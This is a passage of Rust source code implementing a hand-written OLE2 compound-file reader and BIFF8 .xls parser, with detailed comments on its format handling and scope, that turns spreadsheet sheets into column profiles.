            let mini_stream_cutoff = Self::read_u32(&data, 56)?;
            let first_minifat_sector = Self::read_u32(&data, 60)?;
            let num_minifat_sectors = Self::read_u32(&data, 64)?;
            let first_difat_sector = Self::read_u32(&data, 68)?;
            let num_difat_sectors = Self::read_u32(&data, 72)?;
            if !(6..=20).contains(&sector_shift) || !(2..=20).contains(&mini_sector_shift) {
                bail!("unsupported OLE2 sector size");
            }
            let sector_size = 1usize << sector_shift;
            let mini_sector_size = 1usize << mini_sector_shift;

            // The DIFAT: 109 entries embedded in the header, followed by
            // any number of dedicated DIFAT sectors (each holding
            // sector_size/4 - 1 more entries, plus a trailing pointer to
            // the next DIFAT sector).
            let mut fat_sector_locations = Vec::new();
            for i in 0..109 {
                let entry = Self::read_u32(&data, 76 + i * 4)?;
                if entry != CFB_FREESECT {
                    fat_sector_locations.push(entry);
                }
            }
            if num_difat_sectors > 0 {
                let mut sector = first_difat_sector;
                let entries_per_sector = sector_size / 4 - 1;
                for _ in 0..num_difat_sectors {
                    let offset = 512 + sector as usize * sector_size;
                    let chunk = data
                        .get(offset..offset + sector_size)
                        .context("truncated CFB DIFAT sector")?;
                    for i in 0..entries_per_sector {
                        let entry = u32::from_le_bytes(chunk[i * 4..i * 4 + 4].try_into().unwrap());
                        if entry != CFB_FREESECT {
                            fat_sector_locations.push(entry);
                        }
                    }
                    sector = u32::from_le_bytes(
                        chunk[entries_per_sector * 4..entries_per_sector * 4 + 4]
                            .try_into()
                            .unwrap(),
                    );
                    if sector == CFB_ENDOFCHAIN {
                        break;
                    }
                }
            }

            // The FAT itself: each listed sector holds sector_size/4
            // u32 entries.
            let mut fat = Vec::new();
            for &sector in &fat_sector_locations {
                let offset = 512 + sector as usize * sector_size;
                let chunk = data
                    .get(offset..offset + sector_size)
                    .context("truncated CFB FAT sector")?;
                for i in 0..sector_size / 4 {
                    fat.push(u32::from_le_bytes(
                        chunk[i * 4..i * 4 + 4].try_into().unwrap(),
                    ));
                }
            }
            let _ = num_fat_sectors; // informational only; fat_sector_locations is authoritative

            let mut cfb = CfbFile {
                data,
                sector_size,
                mini_sector_size,
                fat,
                mini_fat: Vec::new(),
                mini_stream: Vec::new(),
                mini_stream_cutoff,
                directory: Vec::new(),
            };

            // Directory entries: a chain of sector_size-byte sectors, each
            // holding sector_size/128 fixed 128-byte entries.
            let dir_bytes = cfb.read_chain(first_dir_sector)?;
            let mut directory = Vec::new();
            for entry in dir_bytes.chunks(128) {
                if entry.len() < 128 {
                    break;
                }
                let name_len = u16::from_le_bytes([entry[64], entry[65]]) as usize;
                if name_len < 2 {
                    continue; // unused entry
                }
                // name_len includes the trailing UTF-16 null terminator.
                let name_utf16: Vec<u16> = entry[0..name_len - 2]
                    .chunks(2)
                    .map(|b| u16::from_le_bytes([b[0], b[1]]))
                    .collect();
                let name = String::from_utf16_lossy(&name_utf16);
                let object_type = entry[66];
                let start_sector = u32::from_le_bytes(entry[116..120].try_into().unwrap());
                let stream_size = u64::from_le_bytes(entry[120..128].try_into().unwrap());
                directory.push(CfbDirEntry {
                    name,
                    object_type,
                    start_sector,
                    stream_size,
                });
            }
            cfb.directory = directory;

            // The root entry's own stream *is* the mini stream every small
            // stream's data actually lives inside.
            if let Some(root) = cfb.directory.iter().find(|e| e.object_type == 5)
                && root.start_sector != CFB_ENDOFCHAIN
            {
                cfb.mini_stream = cfb.read_chain(root.start_sector)?;
                cfb.mini_stream.truncate(root.stream_size as usize);
            }
            if num_minifat_sectors > 0 {
                let minifat_bytes = cfb.read_chain(first_minifat_sector)?;
                cfb.mini_fat = minifat_bytes
                    .chunks(4)
                    .filter(|c| c.len() == 4)
                    .map(|c| u32::from_le_bytes(c.try_into().unwrap()))
                    .collect();
            }

            Ok(cfb)
        }

        pub(crate) fn read_stream(&self, name: &str) -> Result<Vec<u8>> {
            let entry = self
                .directory
                .iter()
                .find(|e| e.object_type == 2 && e.name == name)
                .ok_or_else(|| anyhow!("no '{name}' stream in this OLE2 file"))?;
            let mut bytes = if entry.stream_size < u64::from(self.mini_stream_cutoff) {
                self.read_mini_chain(entry.start_sector)?
            } else {
                self.read_chain(entry.start_sector)?
            };
            bytes.truncate(entry.stream_size as usize);
            Ok(bytes)
        }

        /// Cheap existence check used only for content-based format
        /// dispatch (`columns_from_xlsx`) - avoids reading and copying a
        /// stream's full bytes just to decide whether this OLE2 file looks
        /// like a `.xls` workbook at all.
        pub(crate) fn has_stream(&self, name: &str) -> bool {
            self.directory
                .iter()
                .any(|e| e.object_type == 2 && e.name == name)
        }
    }

    // --- Hand-rolled BIFF8 (.xls) reader ---
    // Sits on top of the OLE2/CFBF reader above (the container format) - a
    // `.xls` file's actual spreadsheet content lives in one CFB stream
    // named "Workbook" (or, rarely, the older name "Book"), itself a
    // stream of BIFF8 records: 2-byte type + 2-byte length + that many
    // bytes of data ([MS-XLS] 2.3). Every field layout, record-type
    // number, and encoding rule below was ported directly from calamine's
    // own `xls.rs`/`cfb.rs`/`formats.rs` (checked against the actual
    // installed crate source, not recalled from memory - the same
    // discipline every other hand-rolled reader in this project follows),
    // then verified end-to-end against calamine's own output on a real,
    // LibreOffice-exported `.xls` fixture before being trusted.
    //
    // Deliberately scoped to BIFF8 only - the version every writer anyone
    // would actually feed this tool today produces (Excel 97-2003 itself,
    // and LibreOffice's own "MS Excel 97" export filter, confirmed
    // directly rather than assumed while building the test fixture for
    // this reader). An older BIFF2-5 stream is a clear, disclosed error
    // instead of guessed-at - there's no fixture to verify that path
    // against, the same "no fixture, no trust" boundary this project
    // already draws for SAS7BDAT and (see below) `.xlsb`.
    //
    // Two more deliberate scope boundaries, both chosen because calamine's
    // own reference implementation draws them in the same place, so
    // matching them keeps this reader's output provably identical rather
    // than accidentally more (or less) capable in an untested way:
    //   - Only the SST (shared string table) reads a string that spans a
    //     CONTINUE record (`xls_read_dbcs`/`xls_read_rich_extended_string`,
    //     mirroring calamine's `read_dbcs`/`read_rich_extended_string`,
    //     called through `Record`'s own `continue_record()`). A LABEL
    //     cell's inline string and a FORMAT record's custom format code
    //     are read through a single non-continuing decode
    //     (`xls_decode_plain`, mirroring `XlsEncoding::decode_to`'s own
    //     `min(stream.len(), len)` truncate-don't-error behavior) exactly
    //     because calamine's `parse_label`/`parse_format` do the same -
    //     confirmed directly against their source rather than assumed.
    //   - "Compressed" (1-byte-per-character) string content is decoded as
    //     Latin-1 (each byte maps directly to the same Unicode code point)
    //     rather than through a real per-codepage charset table the way
    //     calamine's `XlsEncoding` (via the `codepage`/`encoding_rs`
    //     crates) does. This is the same "not standards-complete, correct
    //     for the overwhelming common case" tradeoff already made for
    //     `is_email`/`is_url` elsewhere in this project - it only differs
    //     from a true Windows-1252 decode in the rare 0x80-0x9F control
    //     range, and "uncompressed" (real UTF-16LE) content, used for
    //     anything outside plain ASCII by any modern writer, is decoded
    //     exactly regardless of codepage.

    fn xls_read_u16(data: &[u8], pos: usize) -> Result<u16> {
        let b = data
            .get(pos..pos + 2)
            .context("unexpected end of BIFF record data")?;
        Ok(u16::from_le_bytes([b[0], b[1]]))
    }

    fn xls_read_u32(data: &[u8], pos: usize) -> Result<u32> {
        let b = data
            .get(pos..pos + 4)
            .context("unexpected end of BIFF record data")?;
        Ok(u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
    }

    fn xls_read_i32(data: &[u8], pos: usize) -> Result<i32> {
        Ok(xls_read_u32(data, pos)? as i32)
    }

    fn xls_read_f64(data: &[u8], pos: usize) -> Result<f64> {
        let b = data
            .get(pos..pos + 8)
            .context("unexpected end of BIFF record data")?;
        Ok(f64::from_le_bytes(b.try_into().unwrap()))
    }

    fn xls_builtin_format_is_date(ifmt: u16) -> bool {
        matches!(ifmt, 14..=22 | 45 | 46 | 47)
    }

    /// A BIFF record's data, plus any CONTINUE records ([MS-XLS 2.4.54])
    /// immediately following it - a record whose content exceeds the
    /// ~8KB per-record limit is split across a base record and one or
    /// more CONTINUE records, and only a handful of field types (notably
    /// SST strings) are ever read across that boundary. Mirrors
    /// calamine's own `Record`/`RecordIter` exactly, including
    /// `continue_record()`'s "advance to the next stored continuation, or
    /// report none left" contract.
    struct XlsRecord<'a> {
        typ: u16,
        data: &'a [u8],
        cont: Vec<&'a [u8]>,
    }

    impl<'a> XlsRecord<'a> {
        fn continue_record(&mut self) -> bool {
            if self.cont.is_empty() {
                false
            } else {
                self.data = self.cont.remove(0);
                true
            }
        }

        fn skip(&mut self, mut len: usize) -> Result<()> {
            while len > 0 {
                if self.data.is_empty() && !self.continue_record() {
                    bail!("BIFF CONTINUE record ended before an expected field could be skipped");
                }
                let l = len.min(self.data.len());
                self.data = &self.data[l..];
                len -= l;
            }
            Ok(())
        }
    }

    struct XlsRecordIter<'a> {
        stream: &'a [u8],
    }

    impl<'a> Iterator for XlsRecordIter<'a> {
        type Item = Result<XlsRecord<'a>>;

        fn next(&mut self) -> Option<Self::Item> {
            if self.stream.len() < 4 {
                return if self.stream.is_empty() {
                    None
                } else {
                    Some(Err(anyhow!("truncated BIFF record header")))
                };
            }
            let typ = match xls_read_u16(self.stream, 0) {
                Ok(v) => v,
                Err(e) => return Some(Err(e)),
            };
            let len = match xls_read_u16(self.stream, 2) {
                Ok(v) => v as usize,
                Err(e) => return Some(Err(e)),
            };
            if self.stream.len() < len + 4 {
                return Some(Err(anyhow!("truncated BIFF record body")));
            }
            let (record_bytes, rest) = self.stream.split_at(len + 4);
            self.stream = rest;
            let data = &record_bytes[4..];

            // Splice in every immediately-following CONTINUE record
            // (type 0x003C) - these aren't independent records, just this
            // one's overflow content.
            let mut cont = Vec::new();
            loop {
                if self.stream.len() < 4 {
                    break;
                }
                let next_typ = match xls_read_u16(self.stream, 0) {
                    Ok(v) => v,
                    Err(e) => return Some(Err(e)),
                };
                if next_typ != 0x003C {
                    break;
                }
                let cont_len = match xls_read_u16(self.stream, 2) {
                    Ok(v) => v as usize,
                    Err(e) => return Some(Err(e)),
                };
                if self.stream.len() < cont_len + 4 {
                    return Some(Err(anyhow!("truncated BIFF CONTINUE record")));
                }
                let (chunk, rest) = self.stream.split_at(cont_len + 4);
                cont.push(&chunk[4..]);
                self.stream = rest;
            }

            Some(Ok(XlsRecord { typ, data, cont }))
        }
    }

    /// Decodes `len` characters from a single, non-continuing buffer -
    /// used for the two field types calamine itself never reads across a
    /// CONTINUE boundary (a LABEL cell's inline string, a FORMAT record's
    /// custom format code). Truncates cleanly if `data` runs short rather
    /// than erroring, mirroring `XlsEncoding::decode_to`'s own
    /// `min(stream.len(), len)` behavior exactly (verified directly
    /// against calamine's `cfb.rs` source) - a malformed/truncated file
    /// degrades to a shorter string, not a hard failure, the same
    /// leniency this project's other plain-text-ish formats (TOML/YAML/
    /// INI truncated mid-file) already show.
    fn xls_decode_plain(data: &[u8], len: usize, high_byte: bool) -> String {
        if high_byte {
            let l = (data.len() / 2).min(len);
            let units: Vec<u16> = data[..2 * l]
                .chunks_exact(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect();
            char::decode_utf16(units)
                .map(|r| r.unwrap_or('\u{FFFD}'))
                .collect()
        } else {
            let l = data.len().min(len);
            data[..l].iter().map(|&b| b as char).collect()
        }
    }

    /// `XLUnicodeString` [MS-XLS 2.5.294], BIFF8 form only: a 2-byte
    /// `cch`, a 1-byte flags byte (bit 0 = uncompressed/UTF-16 vs
    /// compressed/1-byte), then the character data itself.
    fn xls_parse_unicode_string(data: &[u8]) -> Result<String> {
        if data.len() < 3 {
            if data.len() == 2 && xls_read_u16(data, 0)? == 0 {
                return Ok(String::new());
            }
            bail!("truncated BIFF unicode string");
        }
        let cch = xls_read_u16(data, 0)? as usize;
        let high_byte = data[2] & 0x1 != 0;
        Ok(xls_decode_plain(&data[3..], cch, high_byte))
    }

    /// `ShortXLUnicodeString` [MS-XLS 2.5.240], BIFF8 form: a 1-byte
    /// `cch`, a 1-byte flags byte, then the character data itself - used
    /// for a BOUNDSHEET8 record's sheet name.
    fn xls_parse_short_string(data: &[u8]) -> Result<String> {
        if data.len() < 2 {
            bail!("truncated BIFF short string");
        }
        let cch = data[0] as usize;
        let high_byte = data[1] & 0x1 != 0;
        Ok(xls_decode_plain(&data[2..], cch, high_byte))
    }

    /// CONTINUE-aware character decode, used only by SST string reading
    /// (`xls_read_rich_extended_string`) - mirrors calamine's `read_dbcs`
    /// exactly, including erroring (rather than silently truncating) if
    /// the CONTINUE chain runs out mid-string, and re-reading a fresh
    /// compressed/uncompressed flag byte from the start of each
    /// continuation, per [MS-XLS 2.5.293].
    fn xls_read_dbcs(r: &mut XlsRecord, mut len: usize, mut high_byte: bool) -> Result<String> {
        let mut units: Vec<u16> = Vec::with_capacity(len);
        while len > 0 {
            if r.data.is_empty() {
                if !r.continue_record() {
                    bail!("BIFF SST string ran past the end of its CONTINUE chain");
                }
                if r.data.is_empty() {
                    bail!("empty BIFF CONTINUE record mid-string");
                }
                high_byte = r.data[0] & 0x1 != 0;
                r.data = &r.data[1..];
                continue;
            }
            if high_byte {
                if r.data.len() < 2 {
                    bail!(
                        "a double-byte SST character was split across a CONTINUE record \
                         boundary (not expected in a well-formed BIFF8 file)"
                    );
                }
                units.push(u16::from_le_bytes([r.data[0], r.data[1]]));
                r.data = &r.data[2..];
            } else {
                units.push(r.data[0] as u16);
                r.data = &r.data[1..];
            }
            len -= 1;
        }
        Ok(char::decode_utf16(units)
            .map(|r| r.unwrap_or('\u{FFFD}'))
            .collect())
    }

    /// `XLUnicodeRichExtendedString` [MS-XLS 2.5.293] - one SST entry.
    /// Beyond the plain unicode string, it can carry a formatting-run
    /// block (`rgRun`, skipped - this project only ever wants a cell's
    /// plain text) and an "ExtRst" phonetic-text block (also skipped);
    /// both are just byte-counted and stepped over via `XlsRecord::skip`,
    /// which itself is CONTINUE-aware.
    fn xls_read_rich_extended_string(r: &mut XlsRecord) -> Result<String> {
        if r.data.is_empty() {
            return Ok(String::new());
        }
        if r.data.len() < 3 {
            bail!("truncated BIFF rich string header");
        }
        let cch = xls_read_u16(r.data, 0)? as usize;
        let flags = r.data[2];
        r.data = &r.data[3..];
        let high_byte = flags & 0x1 != 0;

        let mut c_run = 0usize;
        let mut cb_ext_rst = 0usize;
        if flags & 0x8 != 0 {
            if r.data.len() < 2 {
                bail!("truncated BIFF rich string cRun field");
            }
            c_run = xls_read_u16(r.data, 0)? as usize;
            r.data = &r.data[2..];
        }
        if flags & 0x4 != 0 {
            if r.data.len() < 4 {
                bail!("truncated BIFF rich string cbExtRst field");
            }
            cb_ext_rst = xls_read_i32(r.data, 0)? as usize;
            r.data = &r.data[4..];
        }

        let s = xls_read_dbcs(r, cch, high_byte)?;
        r.skip(c_run * 4)?;
        r.skip(cb_ext_rst)?;
        Ok(s)
    }

    /// SST (Shared String Table) [MS-XLS 2.4.265]: an 8-byte header
    /// (`cstTotal`/`cstUnique`, both unused here - the string count is
    /// just "however many rich extended strings are packed into the
    /// record and its CONTINUE chain") followed by that many entries.
    fn xls_parse_sst(r: &mut XlsRecord) -> Result<Vec<String>> {
        if r.data.len() < 8 {
            bail!("truncated SST record");
        }
        r.data = &r.data[8..];
        let mut sst = Vec::new();
        while !r.data.is_empty() || r.continue_record() {
            sst.push(xls_read_rich_extended_string(r)?);
        }
        Ok(sst)
    }

    /// RK's compact 4-byte numeric encoding [MS-XLS 2.5.122]: the 4 bytes
    /// become the *high* 32 bits of an IEEE-754 double (low 32 implicit
    /// zero), except the low 2 bits of the first byte are repurposed as
    /// flags rather than being part of the value - bit 0 (`fX100`) means
    /// "divide the final value by 100", bit 1 (`fInt`) means "this is a
    /// 30-bit integer, left-shifted by 2, rather than a truncated
    /// double". Ported field-for-field from calamine's own `rk_num`.
    fn xls_rk_decode(val: [u8; 4]) -> Result<f64> {
        let d100 = val[0] & 1 != 0;
        let is_int = val[0] & 2 != 0;
        let mut v = [0u8; 8];
        v[4..8].copy_from_slice(&val);
        v[4] &= 0xFC;
        let raw = if is_int {
            (i32::from_le_bytes(v[4..8].try_into().unwrap()) >> 2) as f64
        } else {
            f64::from_le_bytes(v)
        };
        Ok(if d100 { raw / 100.0 } else { raw })
    }

    fn xls_numeric_cell_text(value: f64, is_date: bool) -> String {
        if is_date {
            xlsx_format_serial(value)
        } else {
            value.to_string()
        }
    }

    /// NUMBER [MS-XLS 2.4.190]: row/col/XF-index + a plain 8-byte double.
    fn xls_parse_number(data: &[u8], is_date_by_xf: &[bool]) -> Result<(u32, u32, String)> {
        let d = data.get(0..14).context("truncated NUMBER record")?;
        let row = xls_read_u16(d, 0)? as u32;
        let col = xls_read_u16(d, 2)? as u32;
        let ifmt = xls_read_u16(d, 4)? as usize;
        let v = xls_read_f64(d, 6)?;
        let is_date = is_date_by_xf.get(ifmt).copied().unwrap_or(false);
        Ok((row, col, xls_numeric_cell_text(v, is_date)))
    }

    /// RK [MS-XLS 2.5.122 cell record form]: row/col/XF-index + the
    /// 4-byte RK-encoded value.
    fn xls_parse_rk(data: &[u8], is_date_by_xf: &[bool]) -> Result<(u32, u32, String)> {
        let d = data.get(0..10).context("truncated RK record")?;
        let row = xls_read_u16(d, 0)? as u32;
        let col = xls_read_u16(d, 2)? as u32;
        let ifmt = xls_read_u16(d, 4)? as usize;
        let val: [u8; 4] = d[6..10].try_into().unwrap();
        let v = xls_rk_decode(val)?;
        let is_date = is_date_by_xf.get(ifmt).copied().unwrap_or(false);
        Ok((row, col, xls_numeric_cell_text(v, is_date)))
    }

    /// MULRK [MS-XLS 2.4.176]: several RK cells across one row packed
    /// into a single record - row, first column, `(ifmt, value)` per
    /// column, then the last column index.
    fn xls_parse_mul_rk(data: &[u8], is_date_by_xf: &[bool]) -> Result<Vec<(u32, u32, String)>> {
        if data.len() < 6 {
            bail!("truncated MULRK record");
        }
        let row = xls_read_u16(data, 0)? as u32;
        let col_first = xls_read_u16(data, 2)? as u32;
        let col_last = xls_read_u16(data, data.len() - 2)? as u32;
        let expected = 6 + 6 * (col_last.saturating_sub(col_first) as usize + 1);
        if data.len() != expected {
            bail!("MULRK record length does not match its own column range");
        }
        let body = &data[4..data.len() - 2];
        let mut out = Vec::new();
        for (i, chunk) in body.chunks_exact(6).enumerate() {
            let ifmt = xls_read_u16(chunk, 0)? as usize;
            let val: [u8; 4] = chunk[2..6].try_into().unwrap();
            let v = xls_rk_decode(val)?;
            let is_date = is_date_by_xf.get(ifmt).copied().unwrap_or(false);
            out.push((row, col_first + i as u32, xls_numeric_cell_text(v, is_date)));
        }
        Ok(out)
    }

    /// LABEL [MS-XLS 2.4.148] (and the near-identical RString, 0x00D6):
    /// row/col/XF-index (unused - a label's own value is never a date)
    /// + an `XLUnicodeString`.
    fn xls_parse_label(data: &[u8]) -> Result<(u32, u32, String)> {
        if data.len() < 6 {
            bail!("truncated LABEL record");
        }
        let row = xls_read_u16(data, 0)? as u32;
        let col = xls_read_u16(data, 2)? as u32;
        let s = xls_parse_unicode_string(&data[6..])?;
        Ok((row, col, s))
    }

    /// LABELSST [MS-XLS 2.4.149]: row/col/XF-index + a 4-byte index into
    /// the SST. A file with a LABELSST whose index is somehow out of
    /// range (shouldn't happen in a well-formed file) is skipped rather
    /// than fabricating a value, the same "no fixture, no trust" caution
    /// this project applies elsewhere.
    fn xls_parse_label_sst(data: &[u8], sst: &[String]) -> Result<Option<(u32, u32, String)>> {
        if data.len() < 10 {
            bail!("truncated LABELSST record");
        }
        let row = xls_read_u16(data, 0)? as u32;
        let col = xls_read_u16(data, 2)? as u32;
        let idx = xls_read_u32(data, 6)? as usize;
        Ok(sst.get(idx).map(|s| (row, col, s.clone())))
    }

    fn xls_error_code_to_string(code: u8) -> Result<String> {
        Ok(match code {
            0x00 => "#NULL!",
            0x07 => "#DIV/0!",
            0x0F => "#VALUE!",
            0x17 => "#REF!",
            0x1D => "#NAME?",
            0x24 => "#NUM!",
            0x2A => "#N/A",
            0x2B => "#GETTING_DATA",
            e => bail!("unrecognized BIFF error code {e:#04x}"),
        }
        .to_string())
    }

    /// BoolErr [MS-XLS 2.4.21 / 2.5.16]: row/col/XF-index, then either a
    /// boolean byte or an error-code byte, selected by a trailing flag
    /// byte.
    fn xls_parse_bool_err(data: &[u8]) -> Result<(u32, u32, String)> {
        if data.len() < 8 {
            bail!("truncated BoolErr record");
        }
        let row = xls_read_u16(data, 0)? as u32;
        let col = xls_read_u16(data, 2)? as u32;
        let s = match data[7] {
            0x00 => (data[6] != 0).to_string(),
            0x01 => xls_error_code_to_string(data[6])?,
            e => bail!("unrecognized BIFF BoolErr fError byte {e:#04x}"),
        };
        Ok((row, col, s))
    }

    /// A FORMULA record's cached result value [MS-XLS 2.5.198.2] - an
    /// 8-byte field that's either a plain double, or (signalled by its
    /// last 2 bytes both being 0xFF) a tagged bool/error/blank/"string
    /// follows in the next STRING record" marker. Ported directly from
    /// calamine's `parse_formula_value`; this project deliberately reads
    /// only this cached value; it doesn't parse the formula's own token
    /// stream (`rgce`) into a formula string, mirroring how the OOXML
    /// reader already only surfaces a formula cell's cached `<v>` value.
    fn xls_parse_formula_value(data: &[u8], is_date: bool) -> Result<Option<String>> {
        let d = data.get(0..8).context("truncated FORMULA cached value")?;
        if d[6] == 0xFF && d[7] == 0xFF {
            return Ok(match d[0] {
                0x00 => None, // string result: the next STRING (0x0207) record carries it
                0x01 => Some((d[2] != 0).to_string()),
                0x02 => Some(xls_error_code_to_string(d[2])?),
                0x03 => Some(String::new()),
                e => bail!("unrecognized BIFF formula cached-value type {e:#04x}"),
            });
        }
        let v = xls_read_f64(d, 0)?;
        Ok(Some(xls_numeric_cell_text(v, is_date)))
    }

    /// BoundSheet8 [MS-XLS 2.4.28]: a 4-byte absolute stream offset to
    /// this sheet's own BOF, a visibility byte and a sheet-type byte
    /// (neither needed here - see the module doc comment above for why
    /// this project doesn't filter by sheet type), then the sheet's name
    /// as a `ShortXLUnicodeString`.
    fn xls_parse_boundsheet(data: &[u8]) -> Result<(usize, String)> {
        if data.len() < 6 {
            bail!("truncated BOUNDSHEET8 record");
        }
        let pos = xls_read_u32(data, 0)? as usize;
        let mut name = xls_parse_short_string(&data[6..])?;
        name.retain(|c| c != '\0');
        Ok((pos, name))
    }

    /// Parses the workbook-globals substream - the BIFF record stream
    /// from the very start of the "Workbook" stream up to its first EOF
    /// record - collecting everything needed to read the per-sheet
    /// substreams that follow: each sheet's name and absolute byte
    /// offset (BOUNDSHEET8), the shared string table (SST), and a
    /// per-cell-format ("XF") table resolved down to a simple `is this
    /// format a date/time?` bool (from FORMAT's custom format-code text,
    /// or the fixed built-in-format-ID ranges when no FORMAT record
    /// overrides it) - mirroring OOXML's own `numFmtId`-indexed
    /// `is_date_format` table in spirit, just built from BIFF8's own
    /// record types instead of `styles.xml`.
    struct XlsWorkbookGlobals {
        sheet_positions: Vec<(usize, String)>,
        sst: Vec<String>,
        is_date_by_xf: Vec<bool>,
    }

    fn xls_parse_workbook_globals(stream: &[u8]) -> Result<XlsWorkbookGlobals> {
        let mut biff_checked = false;
        let mut custom_date_formats: HashMap<u16, bool> = HashMap::new();
        let mut xfs: Vec<u16> = Vec::new();
        let mut sheet_positions: Vec<(usize, String)> = Vec::new();
        let mut sst: Vec<String> = Vec::new();

        for record in (XlsRecordIter { stream }) {
            let mut r = record?;
            match r.typ {
                0x0809 => {
                    // BOF [MS-XLS 2.4.21] - only the very first one (this
                    // substream's own) is checked; per-sheet substreams
                    // are parsed separately by `xls_parse_sheet`.
                    if !biff_checked {
                        let biff_version = xls_read_u16(r.data, 0)?;
                        if biff_version != 0x0600 {
                            bail!(
                                "this .xls file uses an older BIFF version (0x{biff_version:04X}) \
                                 - only BIFF8 (Excel 97-2003) is supported; re-save from a newer \
                                 Excel/LibreOffice, or convert to .xlsx"
                            );
                        }
                        biff_checked = true;
                    }
                }
                0x041E => {
                    // Format [MS-XLS 2.4.126] - only a fixed set of custom
                    // format IDs is valid; anything else is skipped
                    // exactly as calamine's own `parse_format` does
                    // (logging and moving on, not failing the file).
                    if r.data.len() >= 2 {
                        let ifmt = xls_read_u16(r.data, 0)?;
                        if matches!(ifmt, 5..=8 | 23..=26 | 41..=44 | 63..=66 | 164..=382) {
                            let code = xls_parse_unicode_string(&r.data[2..])?;
                            custom_date_formats.insert(ifmt, xlsx_is_date_format_code(&code));
                        }
                    }
                }
                0x00E0 => {
                    // XF [MS-XLS 2.4.353] - only the format index (ifmt,
                    // at byte offset 2) is needed here.
                    if r.data.len() >= 4 {
                        xfs.push(xls_read_u16(r.data, 2)?);
                    }
                }
                0x0085 => {
                    sheet_positions.push(xls_parse_boundsheet(r.data)?);
                }
                0x00FC => {
                    sst = xls_parse_sst(&mut r)?;
                }
                0x000A => break, // EOF of the workbook-globals substream
                _ => {}
            }
        }

        if !biff_checked {
            bail!("no BOF record found - not a valid BIFF workbook stream");
        }

        let is_date_by_xf: Vec<bool> = xfs
            .iter()
            .map(|&ifmt| {
                custom_date_formats
                    .get(&ifmt)
                    .copied()
                    .unwrap_or_else(|| xls_builtin_format_is_date(ifmt))
            })
            .collect();

        Ok(XlsWorkbookGlobals {
            sheet_positions,
            sst,
            is_date_by_xf,
        })
    }

    /// Parses one worksheet's own BIFF substream (starting at the byte
    /// offset its BOUNDSHEET8 record gave) into a dense `row x column`
    /// grid, the same shape `xlsx_parse_sheet`/`ods_parse_sheet` already
    /// produce. A FORMULA cell's cached value is used directly; if that
    /// cache says "the real value is a string", the STRING record
    /// immediately following supplies it (`fmla_pos` tracks which cell
    /// that belongs to, since STRING carries no row/col of its own).
    fn xls_parse_sheet(
        stream: &[u8],
        sst: &[String],
        is_date_by_xf: &[bool],
    ) -> Result<Vec<Vec<Option<String>>>> {
        let mut sparse: Vec<(u32, u32, String)> = Vec::new();
        let mut max_row: i64 = -1;
        let mut max_col: i64 = -1;
        let mut fmla_pos: (u32, u32) = (0, 0);

        macro_rules! record_cell {
            ($row:expr, $col:expr, $val:expr) => {{
                let row = $row;
                let col = $col;
                max_row = max_row.max(row as i64);
                max_col = max_col.max(col as i64);
                sparse.push((row, col, $val));
            }};
        }

        for record in (XlsRecordIter { stream }) {
            let r = record?;
            match r.typ {
                0x0203 => {
                    let (row, col, val) = xls_parse_number(r.data, is_date_by_xf)?;
                    record_cell!(row, col, val);
                }
                0x027E => {
                    let (row, col, val) = xls_parse_rk(r.data, is_date_by_xf)?;
                    record_cell!(row, col, val);
                }
                0x00BD => {
                    for (row, col, val) in xls_parse_mul_rk(r.data, is_date_by_xf)? {
                        record_cell!(row, col, val);
                    }
                }
                0x0204 | 0x00D6 => {
                    let (row, col, val) = xls_parse_label(r.data)?;
                    record_cell!(row, col, val);
                }
                0x00FD => {
                    if let Some((row, col, val)) = xls_parse_label_sst(r.data, sst)? {
                        record_cell!(row, col, val);
                    }
                }
                0x0205 => {
                    let (row, col, val) = xls_parse_bool_err(r.data)?;
                    record_cell!(row, col, val);
                }
                0x0006 => {
                    let d = r.data.get(0..14).context("truncated FORMULA record")?;
                    let row = xls_read_u16(d, 0)? as u32;
                    let col = xls_read_u16(d, 2)? as u32;
                    fmla_pos = (row, col);
                    let ifmt = xls_read_u16(d, 4)? as usize;
                    let is_date = is_date_by_xf.get(ifmt).copied().unwrap_or(false);
                    if let Some(val) = xls_parse_formula_value(&d[6..14], is_date)? {
                        record_cell!(row, col, val);
                    }
                }
                0x0207 => {
                    let val = xls_parse_unicode_string(r.data)?;
                    record_cell!(fmla_pos.0, fmla_pos.1, val);
                }
                0x000A => break, // EOF of this worksheet's substream
                _ => {}
            }
        }

        if max_row < 0 || max_col < 0 {
            return Ok(Vec::new());
        }
        let mut grid: Vec<Vec<Option<String>>> =
            vec![vec![None; (max_col + 1) as usize]; (max_row + 1) as usize];
        for (row, col, val) in sparse {
            grid[row as usize][col as usize] = Some(val);
        }
        Ok(grid)
    }

    pub(crate) fn columns_from_xls(
        path: &Path,
        nrows: Option<usize>,
        n_samples: usize,
    ) -> Result<Vec<(String, Vec<ColumnProfile>)>> {
        let cfb = CfbFile::open(path)?;
        let stream = cfb
            .read_stream("Workbook")
            .or_else(|_| cfb.read_stream("Book"))
            .context("no 'Workbook'/'Book' stream in this OLE2 file - not a valid .xls")?;

        let XlsWorkbookGlobals {
            sheet_positions,
            sst,
            is_date_by_xf,
        } = xls_parse_workbook_globals(&stream)?;
        if sheet_positions.is_empty() {
            bail!("no sheets found in {path:?}");
        }

        let mut out = Vec::new();
        for (pos, sheet_name) in sheet_positions {
            let sheet_stream = stream
                .get(pos..)
                .context("BOUNDSHEET8 position past the end of the Workbook stream")?;
            let grid = xls_parse_sheet(sheet_stream, &sst, &is_date_by_xf)?;

            let mut rows = grid.into_iter();
            let Some(header_row) = rows.next() else {
                continue; // empty sheet (or a non-tabular one, e.g. a chart) - contributes no table
            };
            let headers: Vec<String> = header_row
                .iter()
                .map(|c| c.clone().unwrap_or_default())
                .collect();

            let mut raw: Vec<Vec<Option<String>>> = vec![Vec::new(); headers.len()];
            for (i, row) in rows.enumerate() {
                if nrows.is_some_and(|limit| i >= limit) {
                    break;
                }
                for (col_idx, col) in raw.iter_mut().enumerate() {
                    col.push(row.get(col_idx).cloned().flatten());
                }
            }

            let mut profiles = Vec::new();
            for (i, name) in headers.into_iter().enumerate() {
                let total = raw[i].len();
                let non_null: Vec<String> = raw[i].iter().filter_map(|v| v.clone()).collect();
                let current_type = if non_null.is_empty() {
                    "String".to_string()
                } else {
                    let refs: Vec<&str> = non_null.iter().map(|s| s.as_str()).collect();
                    naive_current_type(&refs).to_string()
                };
                let col = ColumnInput {
                    name,
                    current_type,
                    raw_values: non_null,
                    total,
                    skip_heuristics: false,
                };
                profiles.push(profile_column(col, n_samples));
            }
            out.push((sheet_name, profiles));
        }

        if out.is_empty() {
            bail!("no non-empty sheets found in {path:?}");
        }
